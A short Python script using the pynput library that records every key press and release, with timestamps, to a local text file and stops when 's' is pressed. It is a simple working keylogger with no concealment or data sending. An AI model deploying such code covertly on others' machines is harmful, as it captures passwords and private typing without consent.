from pynput.keyboard import Listener
import logging

# Setup logging
# This will save a list of key presses and key releases as a textfile in the same directory we are in.
for handler in logging.root.handlers[:]:
    logging.root.removeHandler(handler)
logging.basicConfig(filename="filename.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')

# This logs the key press and stops when the 's' key is pressed.
def on_press(key):  # The function that's called when a key is pressed
    logging.info("Key pressed: {0}".format(key))
    if key.char == 's':
        listener.stop()
    
# This logs the key release (can probably just put pass so we don't log it)
def on_release(key):  # The function that's called when a key is released
    logging.info("Key released: {0}".format(key))

with Listener(on_press=on_press, on_release=on_release) as listener:  # Create an instance of Listener
    listener.join()  # Join the listener thread to the main thread to keep waiting for keys